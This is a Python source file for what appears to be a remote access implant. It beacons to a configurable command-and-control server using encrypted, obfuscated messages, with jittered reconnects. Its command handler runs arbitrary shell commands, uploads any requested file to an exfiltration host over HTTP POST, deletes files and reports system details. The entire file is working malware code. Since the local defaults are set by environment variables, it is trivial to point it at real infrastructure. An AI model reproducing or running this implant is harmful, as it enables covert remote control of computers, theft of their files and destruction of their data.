#!/usr/bin/env python3
import json
import os
import random
import socket
import struct
import subprocess
import sys
import time

try:
    from urllib.request import urlopen, Request
    from urllib.error import URLError
except ImportError:
    from urllib2 import urlopen, Request, URLError  # Python 2 fallback

from helper import (
    decrypt_message,
    deobfuscate,
    deserialize_public_key,
    encrypt_message,
    generate_keypair,
    obfuscate,
    serialize_public_key,
)

C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
C2_PORT = int(os.environ.get("C2_PORT", "9999"))
EXFIL_HOST = os.environ.get("EXFIL_HOST", C2_HOST)
EXFIL_PORT = int(os.environ.get("EXFIL_PORT", "9090"))
BEACON_MIN = float(os.environ.get("BEACON_MIN", "4"))
BEACON_MAX = float(os.environ.get("BEACON_MAX", "12"))

_data_store = {
    "hostname": socket.gethostname(),
    "os": sys.platform,
    "user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
}


def _send(conn, data):
    conn.sendall(struct.pack(">I", len(data)) + data)


def _recv(conn):
    hdr = b""
    while len(hdr) < 4:
        c = conn.recv(4 - len(hdr))
        if not c:
            raise ConnectionError("closed")
        hdr += c
    length = struct.unpack(">I", hdr)[0]
    buf = b""
    while len(buf) < length:
        c = conn.recv(length - len(buf))
        if not c:
            raise ConnectionError("closed")
        buf += c
    return buf


class _Shutdown(Exception):
    pass


def _ok(rid, payload):
    return {"type": "RESPONSE", "request_id": rid, "status": "OK", "payload": payload}


def _err(rid, code, message):
    return {
        "type": "ERROR",
        "request_id": rid,
        "error": {"code": code, "message": message},
    }


def _handle(msg):
    command = msg.get("command", "")
    rid = msg.get("request_id", "")
    payload = msg.get("payload", {})

    if command == "HEARTBEAT":
        return _ok(rid, {"message": "alive"})

    elif command == "SHUTDOWN":
        raise _Shutdown(rid)

    elif command == "SYSINFO":
        info = {
            "hostname": socket.gethostname(),
            "platform": sys.platform,
            "user": os.environ.get("USER", os.environ.get("USERNAME", "?")),
            "cwd": os.getcwd(),
            "pid": os.getpid(),
        }
        try:
            info["ip"] = socket.gethostbyname(socket.gethostname())
        except Exception:
            info["ip"] = "unknown"
        try:
            with open("/proc/uptime") as fh:
                info["uptime_s"] = float(fh.read().split()[0])
        except Exception:
            pass
        return _ok(rid, info)

    elif command == "RUN_CMD":
        cmd = payload.get("cmd", "")
        if not cmd:
            return _err(rid, 400, "No cmd provided")
        try:
            proc = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            try:
                stdout, stderr = proc.communicate(timeout=15)
            except subprocess.TimeoutExpired:
                proc.kill()
                return _err(rid, 408, "Command timed out: {0}".format(cmd))
            return _ok(
                rid,
                {
                    "cmd": cmd,
                    "stdout": stdout.decode("utf-8", errors="replace").strip(),
                    "stderr": stderr.decode("utf-8", errors="replace").strip(),
                    "returncode": proc.returncode,
                },
            )
        except Exception as exc:
            return _err(rid, 500, str(exc))

    elif command == "EXFIL_FILE":
        path = payload.get("path", "")
        if not path:
            return _err(rid, 400, "No path provided")
        try:
            with open(path, "rb") as fh:
                data = fh.read()
        except Exception as exc:
            return _err(rid, 500, "Read failed: {0}".format(exc))

        filename = os.path.basename(path)
        url = "http://{0}:{1}/upload?filename={2}".format(
            EXFIL_HOST, EXFIL_PORT, filename
        )
        try:
            req = Request(url, data=data, method="POST")
            resp = urlopen(req, timeout=10)
            resp_body = resp.read().decode("utf-8", errors="replace")
            return _ok(
                rid,
                {
                    "path": path,
                    "bytes": len(data),
                    "exfil_to": url,
                    "response": resp_body,
                },
            )
        except Exception as exc:
            return _err(rid, 500, "Exfil POST failed: {0}".format(exc))

    elif command == "READ_DATA":
        key = payload.get("key", "")
        if key not in _data_store:
            return _err(rid, 404, "Key not found: {0!r}".format(key))
        return _ok(rid, {"key": key, "value": _data_store[key]})

    elif command == "WRITE_DATA":
        key = payload.get("key", "")
        value = payload.get("value", "")
        if not key:
            return _err(rid, 400, "No key provided")
        _data_store[key] = value
        return _ok(rid, {"message": "Stored {0!r}".format(key)})

    elif command == "DELETE_FILE":
        path = payload.get("path", "")
        if not path:
            return _err(rid, 400, "No path provided")
        try:
            os.remove(path)
            return _ok(rid, {"message": "Deleted {0}".format(path)})
        except Exception as exc:
            return _err(rid, 500, str(exc))

    else:
        return _err(rid, 400, "Unknown command: {0!r}".format(command))


def beacon():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((C2_HOST, C2_PORT))

                priv_key, pub_key = generate_keypair()
                _send(s, serialize_public_key(pub_key))
                server_pub = deserialize_public_key(_recv(s))

                reg = {
                    "type": "REQUEST",
                    "command": "REGISTER",
                    "request_id": "reg-{0}".format(id(s)),
                    "payload": {
                        "hostname": _data_store["hostname"],
                        "os": _data_store["os"],
                        "user": _data_store["user"],
                    },
                }
                _send(
                    s, obfuscate(encrypt_message(json.dumps(reg).encode(), server_pub))
                )
                ack_raw = _recv(s)
                ack = json.loads(
                    decrypt_message(deobfuscate(ack_raw), priv_key).decode()
                )
                implant_id = ack.get("payload", {}).get("implant_id", "?")

                while True:
                    raw = _recv(s)
                    msg = json.loads(
                        decrypt_message(deobfuscate(raw), priv_key).decode()
                    )
                    try:
                        resp = _handle(msg)
                    except _Shutdown as sig:
                        shut = _ok(str(sig), {"message": "Shutting down."})
                        _send(
                            s,
                            obfuscate(
                                encrypt_message(json.dumps(shut).encode(), server_pub)
                            ),
                        )
                        return
                    _send(
                        s,
                        obfuscate(
                            encrypt_message(json.dumps(resp).encode(), server_pub)
                        ),
                    )

        except (ConnectionRefusedError, ConnectionError, OSError) as exc:
            jitter = random.uniform(BEACON_MIN, BEACON_MAX)
            time.sleep(jitter)

        except Exception:
            jitter = random.uniform(BEACON_MIN, BEACON_MAX)
            time.sleep(jitter)


if __name__ == "__main__":
    beacon()
